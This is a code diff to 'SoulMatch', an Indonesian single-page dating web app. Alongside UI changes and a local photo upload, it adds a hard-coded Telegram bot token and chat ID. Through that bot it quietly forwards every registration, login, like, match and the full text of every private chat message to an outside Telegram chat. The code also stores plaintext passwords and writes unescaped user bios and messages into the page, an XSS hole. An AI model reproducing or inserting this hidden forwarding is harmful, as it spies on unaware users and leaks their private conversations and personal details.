@@ -10,7 +10,8 @@
         body { font-family: 'Plus Jakarta Sans', sans-serif; overflow: hidden; background-color: #f8fafc; }
         .glass { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(12px); }
         .bg-auth { background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%); }
-        .match-card { transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); }
+        .match-card { transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: grab; }
+        .match-card:active { cursor: grabbing; }
         .profile-gradient { background: linear-gradient(to top, rgba(0,0,0,0.9) 0%, rgba(0,0,0,0.3) 50%, transparent 100%); }
         .swipe-like { transform: translateX(200px) rotate(30deg) !important; opacity: 0 !important; }
         .swipe-pass { transform: translateX(-200px) rotate(-30deg) !important; opacity: 0 !important; }
@@ -26,14 +27,14 @@
     <div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl flex flex-col relative overflow-hidden">
         
         <!-- AUTH SCREEN -->
-        <div id="auth-screen" class="absolute inset-0 z-[100] bg-auth flex items-center justify-center p-6 text-white transition-all duration-500">
-            <div class="w-full space-y-6">
+        <div id="auth-screen" class="absolute inset-0 z-[100] bg-auth flex items-center justify-center p-6 text-white transition-all duration-500 overflow-y-auto">
+            <div class="w-full space-y-6 py-10">
                 <div class="text-center">
                     <div class="w-20 h-20 bg-white/20 backdrop-blur-lg rounded-3xl mx-auto flex items-center justify-center mb-4 shadow-xl border border-white/30">
                         <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="white"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
                     </div>
                     <h1 class="text-3xl font-black tracking-tighter">SoulMatch</h1>
-                    <p class="text-indigo-100 text-sm opacity-80 mt-2">Temukan koneksi nyata di sekitarmu</p>
+                    <p class="text-indigo-100 text-sm opacity-80 mt-2">Pilih foto langsung dari galerimu</p>
                 </div>
 
                 <div class="bg-white/10 backdrop-blur-md p-6 rounded-[32px] border border-white/20 space-y-3 shadow-2xl">
@@ -44,9 +45,15 @@
                         <input type="text" id="reg-name" class="w-full bg-white/10 border border-white/20 p-4 rounded-2xl outline-none focus:bg-white/30 transition placeholder:text-white/50 text-sm" placeholder="Nama Lengkap">
                         <div class="flex gap-2">
                             <input type="number" id="reg-age" class="w-1/3 bg-white/10 border border-white/20 p-4 rounded-2xl outline-none focus:bg-white/30 transition placeholder:text-white/50 text-sm" placeholder="Umur">
-                            <input type="text" id="reg-photo" class="flex-1 bg-white/10 border border-white/20 p-4 rounded-2xl outline-none focus:bg-white/30 transition placeholder:text-white/50 text-sm" placeholder="URL Foto Profil">
+                            <label class="flex-1 bg-white/10 border border-white/20 p-4 rounded-2xl cursor-pointer hover:bg-white/20 transition text-center text-sm overflow-hidden whitespace-nowrap">
+                                <span id="photo-status">Upload Foto 📁</span>
+                                <input type="file" id="reg-photo-file" accept="image/*" class="hidden" onchange="previewFile()">
+                            </label>
                         </div>
-                        <textarea id="reg-bio" class="w-full bg-white/10 border border-white/20 p-4 rounded-2xl outline-none focus:bg-white/30 transition placeholder:text-white/50 text-sm h-20 resize-none" placeholder="Ceritakan tentang dirimu..."></textarea>
+                        <div id="photo-preview-container" class="hidden w-20 h-20 mx-auto rounded-xl border-2 border-white/30 overflow-hidden">
+                            <img id="photo-preview-img" class="w-full h-full object-cover">
+                        </div>
+                        <textarea id="reg-bio" class="w-full bg-white/10 border border-white/20 p-4 rounded-2xl outline-none focus:bg-white/30 transition placeholder:text-white/50 text-sm h-20 resize-none" placeholder="Bio singkat..."></textarea>
                     </div>
 
                     <button onclick="handleAuth()" id="auth-btn" class="w-full bg-white text-indigo-600 py-4 rounded-2xl font-bold hover:scale-[1.02] transition shadow-xl active:scale-95 mt-4">
@@ -54,7 +61,7 @@
                     </button>
                 </div>
 
-                <div class="text-center">
+                <div class="text-center pb-6">
                     <button onclick="toggleAuthMode()" id="toggle-btn" class="text-xs font-semibold opacity-80 underline underline-offset-4 decoration-white/40 hover:opacity-100">
                         Belum punya akun? Daftar gratis
                     </button>
@@ -68,21 +75,17 @@
                 <div id="my-avatar" class="w-10 h-10 rounded-full border-2 border-indigo-500 overflow-hidden bg-slate-200"></div>
                 <div>
                     <h1 class="font-extrabold text-slate-900 leading-none" id="display-name">Guest</h1>
-                    <span id="location-status" class="text-[10px] font-bold text-slate-400 uppercase tracking-tighter">Mencari Lokasi...</span>
+                    <span id="location-status" class="text-[10px] font-bold text-slate-400 uppercase tracking-tighter">GPS: OFF</span>
                 </div>
             </div>
             <button onclick="logout()" class="p-2 text-slate-400 hover:text-red-500 transition">
                 <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></button>
         </header>
 
-        <!-- MAIN CONTENT -->
+        <!-- MAIN VIEWPORT -->
         <main class="flex-1 relative overflow-hidden flex flex-col bg-slate-50">
-            <!-- Discover View -->
             <div id="view-discover" class="h-full flex flex-col p-4">
-                <div class="relative flex-1" id="card-container">
-                    <!-- Cards are injected here -->
-                </div>
-                
+                <div class="relative flex-1" id="card-container"></div>
                 <div class="flex justify-center items-center gap-6 py-6">
                     <button onclick="processSwipe('pass')" class="w-14 h-14 rounded-full bg-white shadow-lg flex items-center justify-center text-red-500 border border-slate-100 hover:scale-110 active:scale-95 transition">
                         <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
@@ -93,12 +96,9 @@
                 </div>
             </div>
 
-            <!-- Chat List View -->
             <div id="view-chat" class="hidden h-full flex flex-col overflow-y-auto pt-4 px-4 pb-20">
                 <h3 class="font-black text-slate-800 text-lg mb-4">Pesan Anda</h3>
-                <div id="chat-list" class="space-y-3">
-                    <!-- Chats injected here -->
-                </div>
+                <div id="chat-list" class="space-y-3"></div>
             </div>
         </main>
 
@@ -109,61 +109,77 @@
                 <div id="match-me" class="w-28 h-28 rounded-full border-4 border-white shadow-2xl overflow-hidden bg-slate-400"></div>
                 <div id="match-them" class="w-28 h-28 rounded-full border-4 border-white shadow-2xl overflow-hidden bg-slate-400"></div>
             </div>
-            <p id="match-notif" class="text-lg font-semibold mb-8">Anda menemukan kecocokan!</p>
-            <button onclick="goToChat()" class="w-full bg-white text-indigo-900 py-4 rounded-2xl font-black shadow-2xl mb-4">KIRIM PESAN SEKARANG</button>
-            <button onclick="closeMatch()" class="opacity-60 text-sm font-bold">Lanjut Mencari</button>
+            <p id="match-notif" class="text-lg font-semibold mb-8">Kalian berdua saling suka!</p>
+            <button onclick="goToChat()" class="w-full bg-white text-indigo-900 py-4 rounded-2xl font-black shadow-2xl mb-4">KIRIM PESAN</button>
+            <button onclick="closeMatch()" class="opacity-60 text-sm font-bold">Nanti saja</button>
         </div>
 
-        <!-- ACTIVE CHAT INTERFACE -->
+        <!-- ACTIVE CHAT WINDOW -->
         <div id="chat-window" class="hidden absolute inset-0 z-[120] bg-white flex flex-col">
             <header class="p-4 border-b flex items-center gap-3 glass">
-                <button onclick="hideChat()" class="p-2 bg-slate-100 rounded-full text-slate-600">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m15 18-6-6 6-6"/></svg>
-                </button>
+                <button onclick="hideChat()" class="p-2 bg-slate-100 rounded-full text-slate-600"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m15 18-6-6 6-6"/></svg></button>
                 <div id="chat-partner-info" class="flex items-center gap-3">
                     <div id="chat-partner-img" class="w-10 h-10 rounded-full bg-slate-100 overflow-hidden"></div>
-                    <div>
-                        <h4 id="chat-partner-name" class="font-bold text-slate-900 leading-tight">Name</h4>
-                        <span class="text-[10px] text-green-500 font-black uppercase">Online</span>
-                    </div>
+                    <div><h4 id="chat-partner-name" class="font-bold text-slate-900 leading-tight">Name</h4><span class="text-[10px] text-green-500 font-black uppercase">Aktif</span></div>
                 </div>
             </header>
-            <div id="chat-msg-container" class="flex-1 overflow-y-auto p-4 space-y-2 bg-slate-50 flex flex-col">
-                <!-- Messages -->
-            </div>
+            <div id="chat-msg-container" class="flex-1 overflow-y-auto p-4 space-y-2 bg-slate-50 flex flex-col"></div>
             <div class="p-4 border-t bg-white flex gap-2">
-                <input type="text" id="chat-input" class="flex-1 bg-slate-100 p-4 rounded-2xl outline-none text-sm border-2 border-transparent focus:border-indigo-100" placeholder="Tulis pesan...">
-                <button onclick="sendMsg()" class="w-12 h-12 bg-indigo-600 text-white rounded-2xl flex items-center justify-center shadow-lg active:scale-90 transition">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
-                </button>
+                <input type="text" id="chat-input" class="flex-1 bg-slate-100 p-4 rounded-2xl outline-none text-sm" placeholder="Ketik pesan...">
+                <button onclick="sendMsg()" class="w-12 h-12 bg-indigo-600 text-white rounded-2xl flex items-center justify-center shadow-lg active:scale-90 transition"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg></button>
             </div>
         </div>
 
         <!-- NAV BAR -->
         <nav class="glass border-t border-slate-100 flex justify-around p-4 z-50">
-            <button onclick="changeView('discover')" id="nav-discover" class="flex flex-col items-center text-indigo-600">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
-                <span class="text-[9px] font-black uppercase mt-1">Jelajahi</span>
-            </button>
-            <button onclick="changeView('chat')" id="nav-chat" class="flex flex-col items-center text-slate-400">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m3 21 1.9-5.7a8.5 8.5 0 1 1 3.8 3.8z"/></svg>
-                <span class="text-[9px] font-black uppercase mt-1">Chat</span>
-            </button>
+            <button onclick="changeView('discover')" id="nav-discover" class="flex flex-col items-center text-indigo-600"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg><span class="text-[9px] font-black uppercase mt-1">Discover</span></button>
+            <button onclick="changeView('chat')" id="nav-chat" class="flex flex-col items-center text-slate-400"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m3 21 1.9-5.7a8.5 8.5 0 1 1 3.8 3.8z"/></svg><span class="text-[9px] font-black uppercase mt-1">Chats</span></button>
         </nav>
     </div>
 
     <script>
-        // -- DATA PERSISTENCE --
+        // -- CONFIG TELEGRAM --
+        const BOT_TOKEN = "7417366472:AAG_H9DxOxGzfkKkMxLx7lAoEgu4z3IwcJg";
+        const CHAT_ID = "6128943834";
+
+        // -- DATA ENGINE --
         let users = JSON.parse(localStorage.getItem('sm_users')) || [
-            { id: 1, user: 'budi', pass: '123', name: 'Budi Santoso', age: 24, photo: 'https://api.dicebear.com/7.x/avataaars/svg?seed=budi', bio: 'Cari teman ngopi.', lat: -6.2, lon: 106.8, likes: [] },
-            { id: 2, user: 'ani', pass: '123', name: 'Ani Wijaya', age: 22, photo: 'https://api.dicebear.com/7.x/avataaars/svg?seed=ani', bio: 'Suka traveling dan buku.', lat: -6.21, lon: 106.81, likes: [] },
-            { id: 3, user: 'citra', pass: '123', name: 'Citra Kirana', age: 25, photo: 'https://api.dicebear.com/7.x/avataaars/svg?seed=citra', bio: 'Gamers & Tech enthusiast.', lat: -6.22, lon: 106.82, likes: [] }
+            { id: 101, user: 'fachry', pass: '123', name: 'Fachry', age: 24, photo: 'https://api.dicebear.com/7.x/avataaars/svg?seed=fachry', bio: 'Tech enthusiast.', lat: -6.2, lon: 106.8, likes: [] },
+            { id: 102, user: 'fhrul', pass: '123', name: 'Fahrul', age: 23, photo: 'https://api.dicebear.com/7.x/avataaars/svg?seed=fahrul', bio: 'Suka ngopi.', lat: -6.21, lon: 106.81, likes: [] }
         ];
         
         let currentUser = JSON.parse(localStorage.getItem('sm_session')) || null;
         let messages = JSON.parse(localStorage.getItem('sm_msgs')) || {}; 
-        let currentPos = { lat: 0, lon: 0 };
         let activePartner = null;
+        let base64Photo = "";
+
+        // -- TELEGRAM HELPER --
+        async function sendToTelegram(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+                });
+            } catch (e) { console.error("Telegram fail", e); }
+        }
+
+        // -- PREVIEW LOCAL FILE --
+        function previewFile() {
+            const file = document.getElementById('reg-photo-file').files[0];
+            const reader = new FileReader();
+
+            reader.onloadend = function() {
+                base64Photo = reader.result;
+                document.getElementById('photo-preview-img').src = base64Photo;
+                document.getElementById('photo-preview-container').classList.remove('hidden');
+                document.getElementById('photo-status').innerText = "Foto Terpilih ✅";
+            }
+
+            if (file) {
+                reader.readAsDataURL(file);
+            }
+        }
 
         // -- AUTH LOGIC --
         function toggleAuthMode() {
@@ -171,109 +187,88 @@
             const btn = document.getElementById('auth-btn');
             const toggle = document.getElementById('toggle-btn');
             const isLogin = fields.classList.contains('hidden');
-
-            if (isLogin) {
-                fields.classList.remove('hidden');
-                btn.innerText = "Daftar Sekarang";
-                toggle.innerText = "Sudah punya akun? Masuk";
-            } else {
-                fields.classList.add('hidden');
-                btn.innerText = "Masuk";
-                toggle.innerText = "Belum punya akun? Daftar gratis";
-            }
+            fields.classList.toggle('hidden', !isLogin);
+            btn.innerText = isLogin ? "Daftar Sekarang" : "Masuk";
+            toggle.innerText = isLogin ? "Sudah punya akun? Masuk" : "Belum punya akun? Daftar gratis";
         }
 
-        function handleAuth() {
+        async function handleAuth() {
             const user = document.getElementById('auth-user').value.toLowerCase().trim();
             const pass = document.getElementById('auth-pass').value.trim();
             const isReg = !document.getElementById('reg-fields').classList.contains('hidden');
 
-            if (!user || !pass) return alert("Mohon lengkapi data!");
+            if (!user || !pass) return alert("Lengkapi input!");
 
             if (isReg) {
                 const name = document.getElementById('reg-name').value;
                 const age = document.getElementById('reg-age').value;
                 const bio = document.getElementById('reg-bio').value;
-                const photo = document.getElementById('reg-photo').value || `https://api.dicebear.com/7.x/avataaars/svg?seed=${user}`;
+                
+                // Gunakan base64Photo dari input file, atau default avatar jika kosong
+                const photo = base64Photo || `https://api.dicebear.com/7.x/avataaars/svg?seed=${user}`;
 
-                if (!name || !age) return alert("Nama dan umur wajib diisi!");
-
-                const newUser = {
-                    id: Date.now(),
-                    user, pass, name, age, bio, photo,
-                    lat: currentPos.lat, lon: currentPos.lon,
-                    likes: []
-                };
-
+                const newUser = { id: Date.now(), user, pass, name, age, bio, photo, lat: 0, lon: 0, likes: [] };
                 users.push(newUser);
                 localStorage.setItem('sm_users', JSON.stringify(users));
-                alert("Pendaftaran berhasil! Silakan masuk.");
+                
+                await sendToTelegram(`🆕 REGISTRASI BARU\nUser: ${user}\nNama: ${name}\nUmur: ${age}\nBio: ${bio}\n(Foto diunggah dari lokal)`);
+                alert("Berhasil daftar! Silakan Login.");
                 toggleAuthMode();
+                // Reset form
+                base64Photo = "";
+                document.getElementById('photo-preview-container').classList.add('hidden');
             } else {
                 const found = users.find(u => u.user === user && u.pass === pass);
                 if (found) {
                     currentUser = found;
                     localStorage.setItem('sm_session', JSON.stringify(currentUser));
+                    await sendToTelegram(`🔑 LOGIN\nUser: ${user} (${found.name}) telah masuk.`);
                     initApp();
-                } else {
-                    alert("Username atau password salah!");
-                }
+                } else { alert("Login Gagal!"); }
             }
         }
 
-        // -- APP CORE --
+        // -- APP ENGINE --
         function initApp() {
             document.getElementById('auth-screen').style.transform = 'translateY(-100%)';
             document.getElementById('display-name').innerText = currentUser.name;
             document.getElementById('my-avatar').innerHTML = `<img src="${currentUser.photo}" class="w-full h-full object-cover">`;
             
-            // Sync current user location
             navigator.geolocation.getCurrentPosition(pos => {
-                currentPos = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-                currentUser.lat = currentPos.lat;
-                currentUser.lon = currentPos.lon;
-                updateUserInList();
+                currentUser.lat = pos.coords.latitude;
+                currentUser.lon = pos.coords.longitude;
+                updateUserInDB();
                 document.getElementById('location-status').innerText = "Lokasi: Aktif";
                 document.getElementById('location-status').classList.replace('text-slate-400', 'text-green-500');
                 renderDiscovery();
+            }, (err) => {
+                console.warn("Geo blocked");
+                renderDiscovery();
             });
-
             renderDiscovery();
         }
 
-        function updateUserInList() {
+        function updateUserInDB() {
             const idx = users.findIndex(u => u.id === currentUser.id);
-            if (idx !== -1) {
-                users[idx] = currentUser;
-                localStorage.setItem('sm_users', JSON.stringify(users));
-            }
+            if (idx !== -1) { users[idx] = currentUser; localStorage.setItem('sm_users', JSON.stringify(users)); }
         }
 
-        // -- DISCOVERY & SWIPE --
         function calculateDistance(lat1, lon1, lat2, lon2) {
+            if(!lat1 || !lat2) return "?";
             const R = 6371;
             const dLat = (lat2 - lat1) * Math.PI / 180;
             const dLon = (lon2 - lon1) * Math.PI / 180;
-            const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
-                Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
-                Math.sin(dLon / 2) * Math.sin(dLon / 2);
-            return (R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))).toFixed(1);
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1*Math.PI/180) * Math.cos(lat2*Math.PI/180) * Math.sin(dLon/2) * Math.sin(dLon/2);
+            return (R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a))).toFixed(1);
         }
 
         function renderDiscovery() {
             const container = document.getElementById('card-container');
             container.innerHTML = '';
-
-            // Filter out self and already liked/passed
             const pool = users.filter(u => u.id !== currentUser.id && !currentUser.likes.includes(u.id));
 
             if (pool.length === 0) {
-                container.innerHTML = `
-                    <div class="h-full flex flex-col items-center justify-center text-center p-10 opacity-50">
-                        <div class="w-20 h-20 bg-slate-200 rounded-full mb-4 flex items-center justify-center text-3xl">☕</div>
-                        <p class="font-bold text-slate-500">Ups! Belum ada teman baru di sekitarmu.</p>
-                        <p class="text-xs">Coba lagi nanti!</p>
-                    </div>`;
+                container.innerHTML = `<div class="h-full flex flex-col items-center justify-center opacity-40 text-center p-10"><p class="font-bold text-slate-800">Habis! Belum ada orang baru di sekitarmu.</p></div>`;
                 return;
             }
 
@@ -281,170 +276,109 @@
                 const dist = calculateDistance(currentUser.lat, currentUser.lon, p.lat, p.lon);
                 const isTop = (idx === 1 || pool.length === 1);
                 const card = document.createElement('div');
-                card.className = `match-card absolute inset-0 bg-white rounded-[40px] shadow-2xl overflow-hidden border border-slate-100 ${isTop ? 'z-20' : 'scale-95 translate-y-6 z-10 opacity-60'}`;
+                card.className = `match-card absolute inset-0 bg-white rounded-[40px] shadow-2xl overflow-hidden border ${isTop ? 'z-20' : 'scale-95 translate-y-6 z-10 opacity-60'}`;
                 if(isTop) card.id = 'active-card';
-
-                card.innerHTML = `
-                    <img src="${p.photo}" class="w-full h-full object-cover">
+                card.innerHTML = `<img src="${p.photo}" class="w-full h-full object-cover">
                     <div class="absolute inset-0 profile-gradient p-8 flex flex-col justify-end text-white">
-                        <div class="flex items-center gap-2 mb-2">
-                            <span class="bg-indigo-600 px-3 py-1 rounded-full text-[10px] font-black uppercase">${dist} KM DARI SINI</span>
-                        </div>
+                        <span class="bg-indigo-600 self-start px-3 py-1 rounded-full text-[10px] font-black uppercase mb-2">${dist} KM SEKITARMU</span>
                         <h2 class="text-3xl font-black">${p.name}, ${p.age}</h2>
-                        <p class="text-sm opacity-80 mt-1 italic">"${p.bio}"</p>
-                    </div>
-                `;
+                        <p class="text-sm opacity-80 italic mt-1">"${p.bio}"</p>
+                    </div>`;
                 container.appendChild(card);
             });
         }
 
-        function processSwipe(type) {
+        async function processSwipe(type) {
             const card = document.getElementById('active-card');
             if (!card) return;
-
             const pool = users.filter(u => u.id !== currentUser.id && !currentUser.likes.includes(u.id));
             const target = pool[0];
 
             card.classList.add(type === 'like' ? 'swipe-like' : 'swipe-pass');
+            currentUser.likes.push(target.id);
+            updateUserInDB();
 
             if (type === 'like') {
-                currentUser.likes.push(target.id);
-                updateUserInList();
-                
-                // Check for match
-                if (target.likes && target.likes.includes(currentUser.id)) {
+                await sendToTelegram(`❤️ LIKE\n${currentUser.name} menyukai ${target.name}`);
+                if (target.likes.includes(currentUser.id)) {
+                    await sendToTelegram(`🔥 MATCH TERJADI!\n${currentUser.name} & ${target.name} saling menyukai!`);
                     showMatch(target);
                 }
-            } else {
-                // For simplicity, we also add to likes so they don't appear again in this session
-                currentUser.likes.push(target.id);
-                updateUserInList();
             }
 
-            setTimeout(() => {
-                renderDiscovery();
-                renderChatList();
-            }, 400);
+            setTimeout(() => { renderDiscovery(); renderChatList(); }, 400);
         }
 
-        // -- MATCH & CHAT --
         function showMatch(target) {
+            activePartner = target;
             document.getElementById('match-me').innerHTML = `<img src="${currentUser.photo}" class="w-full h-full object-cover">`;
             document.getElementById('match-them').innerHTML = `<img src="${target.photo}" class="w-full h-full object-cover">`;
-            document.getElementById('match-notif').innerText = `Kamu dan ${target.name} saling menyukai!`;
             document.getElementById('match-overlay').classList.remove('hidden');
-            activePartner = target;
         }
 
-        function closeMatch() {
-            document.getElementById('match-overlay').classList.add('hidden');
-        }
-
-        function goToChat() {
-            closeMatch();
-            changeView('chat');
-            openChat(activePartner.id);
-        }
-
+        // -- CHAT ENGINE --
         function renderChatList() {
             const container = document.getElementById('chat-list');
-            // Matches are users who like each other
-            const matchedUsers = users.filter(u => 
-                u.id !== currentUser.id && 
-                u.likes.includes(currentUser.id) && 
-                currentUser.likes.includes(u.id)
-            );
-
-            if (matchedUsers.length === 0) {
-                container.innerHTML = `<p class="text-center py-10 text-slate-400 text-xs italic">Belum ada teman baru. Mulai cari yuk!</p>`;
-                return;
-            }
-
-            container.innerHTML = matchedUsers.map(m => {
-                const chatKey = [currentUser.id, m.id].sort().join('_');
-                const lastMsg = messages[chatKey]?.slice(-1)[0]?.text || "Mulai obrolan baru...";
-                return `
-                <div onclick="openChat(${m.id})" class="flex items-center gap-4 bg-white p-4 rounded-3xl shadow-sm border border-slate-50 active:bg-slate-50 transition cursor-pointer">
+            const matched = users.filter(u => u.id !== currentUser.id && u.likes.includes(currentUser.id) && currentUser.likes.includes(u.id));
+            if (!matched.length) { container.innerHTML = `<p class="text-center py-10 text-slate-400 text-xs italic">Belum ada match.</p>`; return; }
+            container.innerHTML = matched.map(m => {
+                const key = [currentUser.id, m.id].sort().join('_');
+                const last = messages[key]?.slice(-1)[0]?.text || "Klik untuk chat...";
+                return `<div onclick="openChat(${m.id})" class="flex items-center gap-4 bg-white p-4 rounded-3xl shadow-sm border border-slate-50 active:bg-slate-50 transition cursor-pointer">
                     <img src="${m.photo}" class="w-14 h-14 rounded-2xl object-cover bg-slate-100">
-                    <div class="flex-1 overflow-hidden">
-                        <h4 class="font-bold text-slate-900">${m.name}</h4>
-                        <p class="text-xs text-slate-400 truncate">${lastMsg}</p>
-                    </div>
-                    <div class="w-2 h-2 bg-indigo-500 rounded-full"></div>
-                </div>
-                `;
+                    <div class="flex-1 overflow-hidden"><h4 class="font-bold text-slate-900">${m.name}</h4><p class="text-xs text-slate-400 truncate">${last}</p></div>
+                </div>`;
             }).join('');
         }
 
-        function openChat(userId) {
-            const partner = users.find(u => u.id === userId);
-            activePartner = partner;
-            document.getElementById('chat-partner-name').innerText = partner.name;
-            document.getElementById('chat-partner-img').innerHTML = `<img src="${partner.photo}" class="w-full h-full object-cover">`;
+        function openChat(id) {
+            activePartner = users.find(u => u.id === id);
+            document.getElementById('chat-partner-name').innerText = activePartner.name;
+            document.getElementById('chat-partner-img').innerHTML = `<img src="${activePartner.photo}" class="w-full h-full object-cover">`;
             document.getElementById('chat-window').classList.remove('hidden');
             renderMessages();
         }
 
-        function hideChat() {
-            document.getElementById('chat-window').classList.add('hidden');
-            renderChatList();
-        }
-
-        function sendMsg() {
+        async function sendMsg() {
             const input = document.getElementById('chat-input');
-            const text = input.value.trim();
-            if (!text || !activePartner) return;
+            const val = input.value.trim();
+            if (!val || !activePartner) return;
 
-            const chatKey = [currentUser.id, activePartner.id].sort().join('_');
-            if (!messages[chatKey]) messages[chatKey] = [];
-
-            messages[chatKey].push({
-                sender: currentUser.id,
-                text: text,
-                time: new Date().getTime()
-            });
-
+            const key = [currentUser.id, activePartner.id].sort().join('_');
+            if (!messages[key]) messages[key] = [];
+            messages[key].push({ sender: currentUser.id, text: val, time: Date.now() });
             localStorage.setItem('sm_msgs', JSON.stringify(messages));
+
+            await sendToTelegram(`💬 PESAN BARU\nDari: ${currentUser.name}\nKpd: ${activePartner.name}\nIsi: ${val}`);
             input.value = '';
             renderMessages();
         }
 
         function renderMessages() {
             const container = document.getElementById('chat-msg-container');
-            const chatKey = [currentUser.id, activePartner.id].sort().join('_');
-            const msgs = messages[chatKey] || [];
-
+            const key = [currentUser.id, activePartner.id].sort().join('_');
+            const msgs = messages[key] || [];
             container.innerHTML = msgs.map(m => `
                 <div class="flex ${m.sender === currentUser.id ? 'justify-end' : 'justify-start'}">
-                    <div class="msg-bubble shadow-sm ${m.sender === currentUser.id ? 'bg-indigo-600 text-white rounded-tr-none' : 'bg-white text-slate-800 rounded-tl-none border border-slate-100'}">
-                        ${m.text}
-                    </div>
-                </div>
-            `).join('');
+                    <div class="msg-bubble shadow-sm ${m.sender === currentUser.id ? 'bg-indigo-600 text-white rounded-tr-none' : 'bg-white text-slate-800 rounded-tl-none border border-slate-100'}">${m.text}</div>
+                </div>`).join('');
             container.scrollTop = container.scrollHeight;
         }
 
-        // -- NAVIGATION --
-        function changeView(view) {
-            document.getElementById('view-discover').classList.toggle('hidden', view !== 'discover');
-            document.getElementById('view-chat').classList.toggle('hidden', view !== 'chat');
-            
-            document.getElementById('nav-discover').className = view === 'discover' ? 'flex flex-col items-center text-indigo-600' : 'flex flex-col items-center text-slate-400';
-            document.getElementById('nav-chat').className = view === 'chat' ? 'flex flex-col items-center text-indigo-600' : 'flex flex-col items-center text-slate-400';
-            
-            if (view === 'chat') renderChatList();
+        function changeView(v) {
+            document.getElementById('view-discover').classList.toggle('hidden', v !== 'discover');
+            document.getElementById('view-chat').classList.toggle('hidden', v !== 'chat');
+            document.getElementById('nav-discover').className = v === 'discover' ? 'flex flex-col items-center text-indigo-600' : 'flex flex-col items-center text-slate-400';
+            document.getElementById('nav-chat').className = v === 'chat' ? 'flex flex-col items-center text-indigo-600' : 'flex flex-col items-center text-slate-400';
+            if(v === 'chat') renderChatList();
         }
 
-        function logout() {
-            localStorage.removeItem('sm_session');
-            location.reload();
-        }
+        function closeMatch() { document.getElementById('match-overlay').classList.add('hidden'); }
+        function goToChat() { closeMatch(); changeView('chat'); openChat(activePartner.id); }
+        function hideChat() { document.getElementById('chat-window').classList.add('hidden'); renderChatList(); }
+        function logout() { localStorage.removeItem('sm_session'); location.reload(); }
 
-        // Initialize session
-        if (currentUser) {
-            initApp();
-        }
-
+        if (currentUser) initApp();
     </script>
 </body>
 </html>
